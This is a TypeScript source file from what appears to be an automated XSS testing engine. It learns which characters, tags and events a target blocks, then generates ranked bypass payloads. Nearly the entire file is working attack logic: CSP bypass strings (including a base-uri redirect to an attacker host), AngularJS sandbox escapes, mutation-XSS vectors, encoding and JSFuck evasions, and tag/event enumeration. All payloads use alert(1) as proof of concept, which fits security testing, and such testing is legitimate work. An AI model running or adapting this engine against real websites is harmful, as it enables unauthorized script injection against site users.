/**
 * Mutation Composer — The brain of the 5-rotor XSS engine.
 *
 * Orchestrates context detection, blocker analysis, encoding, structure
 * mutation, and execution vector selection. Accumulates knowledge from
 * every probe to narrow the search space.
 */
import masterRules from "../../../tests/cascade-rules/MASTER-RULES.json" with { type: "json" };
import { getBaselineForContext } from "./baselines.ts";
import {
  buildCascadeAlternatives,
  inferBlockers,
  shouldPivotToEnumeration,
  type ComponentObservation,
  EVENT_CASCADE,
  TAG_CASCADE,
  SCRIPT_CASCADE,
  HREF_CASCADE,
  WINDOW_CASCADE
} from "./blockers.ts";
import { applyEncoder, selectiveEncode, inferEffectiveEncodings, ENCODER_ORDER } from "./encoders.ts";
import { ADVANCED_STRUCTURE_CANDIDATES } from "./structures.ts";
import { EXECUTION_CASCADE } from "./executors.ts";
import { COMPOSITE_TRIGGERS } from "./composite-triggers.ts";
import { selectAngularEscapes, detectAngularVersion } from "./angular.ts";
import { selectCspBypassStrategies, type CspBypassStrategy } from "./csp.ts";
import { MXSS_VECTORS, buildMxssDetectionScript, analyzeMxss } from "./mxss.ts";

export interface PartialSuccess {
  family: string;
  value: string;
}

export interface KnowledgeState {
  context: string;
  blockedFamilies: Map<string, Set<string>>;
  footholds: PartialSuccess[];
  testedPayloads: Set<string>;
  blockedTags: Set<string>;
  successfulFamilies: Map<string, Set<string>>;
  successfulEvents: string[];
  binarySearches: ComponentObservation[][];
  notes: string[];
  cspDetected: boolean;
  /** Raw CSP header when available — feeds directive-aware strategy selection. */
  cspHeaderRaw?: string;
  /** AngularJS version detected from response body — null when unknown. */
  angularVersion?: string | null;
}

export interface MutationCandidate {
  payload: string;
  rotor: keyof typeof masterRules.rotorWeights;
  rationale: string;
  family?: string;
}

export class MutationComposer {
  readonly state: KnowledgeState;

  constructor(context: string) {
    this.state = {
      context,
      blockedFamilies: new Map(),
      footholds: [],
      testedPayloads: new Set(),
      blockedTags: new Set(),
      successfulFamilies: new Map(),
      successfulEvents: [],
      binarySearches: [],
      notes: [],
      cspDetected: false,
      cspHeaderRaw: undefined,
      angularVersion: null
    };
  }

  /** Set the raw CSP header so the composer can parse directives and select
   *  only strategies whose preconditions match the actual policy. */
  setCspRawHeader(header: string): void {
    this.state.cspHeaderRaw = header;
    if (header) this.setCspDetected(true);
  }

  /** Set Angular version (from `detectAngularVersion`) so the composer
   *  selects the matching R4 escape set for `angular_expression` context. */
  setAngularVersion(version: string | null): void {
    this.state.angularVersion = version;
    if (version) this.state.notes.push(`AngularJS ${version} detected — applying version-differential sandbox escapes`);
  }

  setCspDetected(detected: boolean): void {
    if (detected && !this.state.cspDetected) {
      this.state.notes.push("CSP detected, shifting priority to CSP bypass strategies");
    }
    this.state.cspDetected = detected;
  }

  absorbBinarySearch(observations: ComponentObservation[]): void {
    this.state.binarySearches.push(observations);
    for (const observation of observations) {
      if (observation.successful) {
        const current = this.state.successfulFamilies.get(observation.family) ?? new Set<string>();
        current.add(observation.value);
        this.state.successfulFamilies.set(observation.family, current);
      }
    }
    for (const inferred of inferBlockers(observations)) {
      const current = this.state.blockedFamilies.get(inferred.family) ?? new Set<string>();
      for (const value of inferred.blockedValues) {
        current.add(value);
        if (inferred.family === "tag") {
          this.state.blockedTags.add(value);
        }
      }
      this.state.blockedFamilies.set(inferred.family, current);
      this.state.notes.push(`Blocked ${inferred.family}: ${inferred.blockedValues.join(", ")}`);
    }
  }

  absorbPartialSuccess(family: string, value: string): void {
    if (!this.state.footholds.some((entry) => entry.family === family && entry.value === value)) {
      this.state.footholds.push({ family, value });
    }
    if (family === "event" && !this.state.successfulEvents.includes(value)) {
      this.state.successfulEvents.push(value);
    }
  }

  /**
   * Union-merge another composer's live knowledge state (full bidirectional
   * transfer for stored-XSS workflow stages). Does NOT overwrite `context` —
   * each stage keeps its own detected context; blockers/footholds/tested
   * payloads/CSP/Angular knowledge flow both parent→stage and stage→parent.
   */
  absorbState(other: KnowledgeState): void {
    const mergeSet = (target: Set<string>, source: Set<string>) => source.forEach((v) => target.add(v));
    const mergeMap = (target: Map<string, Set<string>>, source: Map<string, Set<string>>) => {
      for (const [key, values] of source) {
        const current = target.get(key) ?? new Set<string>();
        mergeSet(current, values);
        target.set(key, current);
      }
    };

    mergeMap(this.state.blockedFamilies, other.blockedFamilies);
    mergeMap(this.state.successfulFamilies, other.successfulFamilies);
    for (const foothold of other.footholds) {
      if (!this.state.footholds.some((f) => f.family === foothold.family && f.value === foothold.value)) {
        this.state.footholds.push(foothold);
      }
    }
    mergeSet(this.state.testedPayloads, other.testedPayloads);
    mergeSet(this.state.blockedTags, other.blockedTags);
    for (const event of other.successfulEvents) {
      if (!this.state.successfulEvents.includes(event)) this.state.successfulEvents.push(event);
    }
    for (const search of other.binarySearches) {
      if (!this.state.binarySearches.includes(search)) this.state.binarySearches.push(search);
    }
    for (const note of other.notes) {
      if (!this.state.notes.includes(note)) this.state.notes.push(note);
    }
    if (other.cspDetected) this.setCspDetected(true);
    if (!this.state.cspHeaderRaw && other.cspHeaderRaw) this.setCspRawHeader(other.cspHeaderRaw);
    if (!this.state.angularVersion && other.angularVersion) this.setAngularVersion(other.angularVersion);
  }

  nextCandidates(): MutationCandidate[] {
    const candidates: MutationCandidate[] = [];
    const baseline = getBaselineForContext(this.state.context as never);

    if (!this.state.testedPayloads.has(baseline.payload)) {
      candidates.push({
        payload: baseline.payload,
        rotor: "context",
        rationale: `Baseline for ${baseline.context}`,
        family: "baseline"
      });
    }

    // ── CSP Bypass Cascade ────────────────────────────────────────────
    if (this.state.cspDetected) {
      // Base 13-strategy cascade (backwards compatible)
      const baseCspBypasses = [
        "script_src_data", "script_src_unsafe_eval", "script_nonce_reuse",
        "script_base_uri", "requirejs_bypass", "angular_bypass",
        "jsonp_bypass", "dynamic_script", "dom_clobbering", "mutation_xss",
        "template_injection", "svg_anim", "math_mml"
      ];
      for (const bypass of baseCspBypasses) {
        const payload = this._payloadForCspBypass(baseline.payload, bypass);
        if (payload) {
          candidates.push({
            payload,
            rotor: "structure",
            rationale: `CSP Bypass: ${bypass}`,
            family: "csp"
          });
        }
      }

      // Directive-aware strategies from parsed CSP header (if raw header available)
      if (this.state.cspHeaderRaw) {
        const directiveStrategies = selectCspBypassStrategies(this.state.cspHeaderRaw);
        for (const strategy of directiveStrategies) {
          candidates.push({
            payload: strategy.payload,
            rotor: "structure",
            rationale: `CSP Directive Bypass: ${strategy.name} — ${strategy.rationale}`,
            family: "csp_directive"
          });
        }
      }
    }

    // ── Rotor 2: Blocker Alternates ───────────────────────────────────
    for (const family of ["keyword", "event", "space", "tag", "href", "window", "script", "paren", "angle", "quote"]) {
      const blocked = this.state.blockedFamilies.get(family) ?? new Set<string>();
      for (const alternative of buildCascadeAlternatives(family).filter((item) => !blocked.has(item)).slice(0, 4)) {
        const payload = this._applyFamilyAlternative(baseline.payload, family, alternative);
        if (!payload) continue;
        candidates.push({
          payload,
          rotor: "blockers",
          rationale: `${family} cascade fallback: ${alternative}`,
          family
        });
      }
    }

    // ── Rotor 4: Advanced Structure Substitutions ─────────────────────
    const parenBlocked = (this.state.blockedFamilies.get("paren") ?? new Set<string>()).size > 0;
    const quoteBlocked = (this.state.blockedFamilies.get("quote") ?? new Set<string>()).size > 0;
    const angleBlocked = (this.state.blockedFamilies.get("angle") ?? new Set<string>()).size > 0;

    if (parenBlocked || quoteBlocked || angleBlocked) {
      for (const candidate of ADVANCED_STRUCTURE_CANDIDATES.slice(0, 8)) {
        candidates.push({
          payload: candidate.payload,
          rotor: "structure",
          rationale: `Structure cascade: ${candidate.name}`,
          family: candidate.blockerFamily ?? "structure"
        });
      }
    }

    // ── Composite Triggers ────────────────────────────────────────────
    for (const trigger of COMPOSITE_TRIGGERS) {
      if (trigger.when.every((family) => (this.state.blockedFamilies.get(family) ?? new Set<string>()).size > 0)) {
        for (const strategy of trigger.strategies) {
          const payload = this._payloadForCompositeStrategy(strategy);
          if (!payload) continue;

          candidates.push({
            payload,
            rotor: "structure",
            rationale: `Composite trigger ${trigger.when.join("+")} => ${strategy}`,
            family: "composite"
          });
        }
      }
    }

    // ── AngularJS deeper coverage (R4: Structure) ──────────────────────
    if (this.state.context === "angular_expression" && this.state.angularVersion) {
      const angularEscapes = selectAngularEscapes(this.state.angularVersion);
      for (const escape of angularEscapes) {
        // Angular escape payloads are placed inside {{ }} — template expression context
        const payload = `{{${escape.expression}}}`;
        candidates.push({
          payload,
          rotor: "structure",
          rationale: `AngularJS ${this.state.angularVersion} ${escape.technique}`,
          family: "angular"
        });
      }
    }

    // ── Mutation XSS (mXSS) — parser differential vectors (R4: Structure) ─
    // These vectors target sanitizer-vs-renderer re-parse boundaries. They are
    // applicable when the injection context involves HTML ingestion via innerHTML,
    // createContextualFragment, or similar DOM parsing sinks.
    const mxssApplicable = ["html_content", "html_attribute", "inner_html_sink",
      "outer_html_sink", "insert_adjacent_html_sink", "document_write_sink"].includes(this.state.context);
    if (mxssApplicable) {
      for (const vector of MXSS_VECTORS.slice(0, 6)) {
        candidates.push({
          payload: vector.payload,
          rotor: "structure",
          rationale: `mXSS vector: ${vector.name} — re-exposes ${vector.reExposesSink}`,
          family: "mxss"
        });
      }
    }

    // ── Rotor 3: Smart Encoding Layer ─────────────────────────────────
    const inferredEncoders = inferEffectiveEncodings(this.state.blockedFamilies, this.state.context);
    const encodersToTry = inferredEncoders.length > 0 ? inferredEncoders : ENCODER_ORDER.slice(0, 6);

    for (const encoder of encodersToTry) {
      candidates.push({
        payload: applyEncoder(baseline.payload, encoder),
        rotor: "encoding",
        rationale: `Encoding layer (full): ${encoder}`,
        family: "encoding"
      });

      // Also try selective encoding based on the actual blocked families
      const globalBlockedChars = new Set<string>([
        ...(this.state.blockedFamilies.get("angle") ?? []),
        ...(this.state.blockedFamilies.get("quote") ?? []),
        ...(this.state.blockedFamilies.get("paren") ?? []),
        ...(this.state.blockedFamilies.get("space") ?? [])
      ]);

      if (globalBlockedChars.size > 0) {
        candidates.push({
          payload: selectiveEncode(baseline.payload, globalBlockedChars, encoder),
          rotor: "encoding",
          rationale: `Encoding layer (selective): ${encoder} on ${[...globalBlockedChars].join("")}`,
          family: "encoding_selective"
        });
      }
    }

    // ── Rotor 5: Execution Cascade ────────────────────────────────────
    for (const executor of EXECUTION_CASCADE.slice(0, 8)) {
      candidates.push({
        payload: executor.payload,
        rotor: "execution",
        rationale: `Executor cascade: ${executor.name}`,
        family: executor.mode
      });
    }

    // ── Foothold Iteration ────────────────────────────────────────────
    for (const foothold of this.state.footholds) {
      if (foothold.family === "tag") {
        for (const eventName of EVENT_CASCADE.slice(0, 5)) {
          candidates.push({
            payload: `<${foothold.value} ${eventName}=alert(1)>`,
            rotor: "blockers",
            rationale: `Build on foothold tag ${foothold.value}`,
            family: "event"
          });
        }
      }
      if (foothold.family === "event") {
        for (const tag of TAG_CASCADE.slice(0, 5)) {
          candidates.push({
            payload: `<${tag} ${foothold.value}=alert(1)>`,
            rotor: "structure",
            rationale: `Build on foothold event ${foothold.value}`,
            family: "tag"
          });
        }
      }
    }

    // ── Pivot: Exhaustive Enumeration ─────────────────────────────────
    const cascadesExhausted = candidates.every((candidate) => this.state.testedPayloads.has(candidate.payload));
    if (shouldPivotToEnumeration(this.state.blockedTags, cascadesExhausted)) {
      const prioritizedEvents = this.state.successfulEvents.length > 0
        ? [...this.state.successfulEvents, ...masterRules.events.filter((e) => !this.state.successfulEvents.includes(e))]
        : masterRules.events;

      for (const tag of masterRules.tags.slice(0, masterRules.pivot.tagCount)) {
        for (const eventName of prioritizedEvents.slice(0, 24)) {
          candidates.push({
            payload: `<${tag} ${eventName}=alert(1) tabindex=1>`,
            rotor: "structure",
            rationale: `Pivot to enumeration: ${tag}/${eventName}`,
            family: "enumeration"
          });
        }
      }
    }

    // Deduplicate and filter already tested payloads
    const deduped = candidates.filter((candidate) => {
      if (this.state.testedPayloads.has(candidate.payload)) {
        return false;
      }
      this.state.testedPayloads.add(candidate.payload);
      return true;
    });

    return deduped.sort((a, b) => masterRules.rotorWeights[b.rotor] - masterRules.rotorWeights[a.rotor]);
  }

  exportState(): Record<string, unknown> {
    return {
      context: this.state.context,
      blockedFamilies: Object.fromEntries(
        [...this.state.blockedFamilies.entries()].map(([key, values]) => [key, [...values]])
      ),
      footholds: this.state.footholds,
      blockedTags: [...this.state.blockedTags],
      successfulEvents: this.state.successfulEvents,
      successfulFamilies: Object.fromEntries(
        [...this.state.successfulFamilies.entries()].map(([key, values]) => [key, [...values]])
      ),
      binarySearches: this.state.binarySearches,
      testedPayloads: [...this.state.testedPayloads],
      notes: this.state.notes,
      cspDetected: this.state.cspDetected
    };
  }

  private _applyFamilyAlternative(payload: string, family: string, alternative: string): string {
    switch (family) {
      case "keyword":
        // Keyword cascade entries may be templates like "eval(atob(...))" —
        // map the well-known names; fall back to literal replace for simple alts.
        if (alternative === "eval(atob(...))") {
          return payload.replaceAll("alert(1)", "eval(atob('YWxlcnQoMSk='))")
            .replaceAll("alert", "eval");
        }
        if (alternative === "String.fromCharCode(...)") {
          return payload.replaceAll("alert(1)", "eval(String.fromCharCode(97,108,101,114,116,40,49,41))")
            .replaceAll("alert", "eval");
        }
        return payload.replaceAll("alert", alternative);
      case "event":
        return payload.replaceAll("onerror", alternative).replaceAll("onload", alternative);
      case "space": {
        // MASTER-RULES uses symbolic names; map to real whitespace/comment bytes.
        // Competitor SPACE cascade: tab → newline → slash → formfeed → VT → JS comment
        const spaceMap: Record<string, string> = {
          tab: "\t",
          newline: "\n",
          slash: "/",
          formfeed: "\f",
          vertical_tab: "\v",
          js_comment: "/**/",
          "/**/": "/**/"
        };
        const replacement = spaceMap[alternative] ?? alternative;
        return payload.replaceAll(" ", replacement);
      }
      case "tag":
        // Replace only the opening tag name, not the trailing attributes.
        // Bug fix: previous form produced `<svg>> src=x...` by appending `>`.
        return payload.replace(/<([a-z0-9-]+)/i, `<${alternative}`);
      case "href": {
        // Cascade names are strategy labels, not literal protocol strings.
        const hrefMap: Record<string, string> = {
          data_uri: "data:text/html,<svg onload=alert(1)>",
          protocol_smuggling: "java\tscript:alert(1)",
          tab_inject: "java\tscript:alert(1)"
        };
        if (hrefMap[alternative]) return hrefMap[alternative];
        return payload.includes("javascript:")
          ? payload.replace("javascript:", alternative)
          : `${alternative}alert(1)`;
      }
      case "window":
        return payload.replaceAll("window", alternative);
      case "script":
        if (alternative === "close_tag") return "</script><svg onload=alert(1)>";
        if (alternative === "backslash") return "\\x3csvg onload=alert(1)\\x3e";
        if (alternative === "unicode") return "\\u003csvg onload=alert(1)\\u003e";
        return payload;
      default:
        return "";
    }
  }

  private _payloadForCompositeStrategy(strategy: string): string {
    switch (strategy) {
      case "custom-elements":
        return "<xss onfocus=alert(1) tabindex=1>";
      case "interaction-events":
        return "<custom-element onmouseover=alert(1)>hover</custom-element>";
      case "dom-clobbering":
        return '<a id=config></a><a id=config name=src href="javascript:alert(1)"></a>';
      case "confirm-prompt-print":
        return "<img src=x onerror=confirm(1)>";
      case "paren-bypass-cascade":
        return "throw onerror=alert,1";
      case "jsfuck":
        return "[][(![]+[])[+[]]+([][[]]+[])[+!+[]+[+[]]]][([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[!+[]+!+[]]]()";
      case "html-entity-angle":
        return "&#x3c;img src=x onerror=alert(1)&#x3e;";
      case "svg-decode":
        return "<svg><script>&#97;lert(1)</script></svg>";
      case "href-data-uri":
        return '<a href="data:text/html,<svg onload=alert(1)>">go</a>';
      case "window.name":
        return "<script>window.name='javascript:alert(1)'</script>";
      case "svg-upload":
        return '<svg><script href="data:,alert(1)" /></svg>';
      default:
        return "";
    }
  }

  private _payloadForCspBypass(baseline: string, strategy: string): string | null {
    switch (strategy) {
      case "script_src_data":
        return '<script src="data:,alert(1)"></script>';
      case "script_src_unsafe_eval":
        return "<script>setTimeout('alert(1)')</script>";
      case "script_base_uri":
        return '<base href="https://attacker.com/">';
      case "script_nonce_reuse":
        return '<!-- XSS in page with static nonce --><script nonce="static_nonce">alert(1)</script>';
      case "requirejs_bypass":
        return '<script data-main="data:,alert(1)//" src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js"></script>';
      case "angular_bypass":
        return '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script><div ng-app><div ng-bind="constructor.constructor(\'alert(1)\')()"></div></div>';
      case "jsonp_bypass":
        return '<script src="https://example.com/callback?cb=alert(1)//"></script>';
      case "dynamic_script":
        return "<script>var s=document.createElement('script');s.src='data:,alert(1)';document.body.appendChild(s)</script>";
      case "dom_clobbering":
        return '<a id="config"></a><a id="config" name="config" href="javascript:alert(1)"></a>';
      case "mutation_xss":
        return '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
      case "template_injection":
        return '<template><script>alert(1)</script></template>';
case "svg_anim":
        return '<svg><animate onbegin=alert(1) attributeName=x dur=1s>';
      case "math_mml":
        return '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>>';
      case "trusted_types_bypass":
        return `<script>trustedTypes.createPolicy('default',{createHTML:s=>s,createScript:s=>s,createScriptURL:s=>s});</script><img src=x onerror=alert(1)>`;
      case "strict_dynamic_bypass":
        return `<script>document.currentScript.parentNode.appendChild(Object.assign(document.createElement('script'),{textContent:'alert(1)'}))</script>`;
      case "extracted_nonce_reuse":
        // Nonce will be substituted by caller if ${nonce} placeholder present
        return `<script nonce="${this.state.cspHeaderRaw?.match(/nonce-([a-zA-Z0-9_\-]+)/)?.[1] ?? 'auto'}">alert(1)</script>`;
      default:
        return null;
    }
  }
}
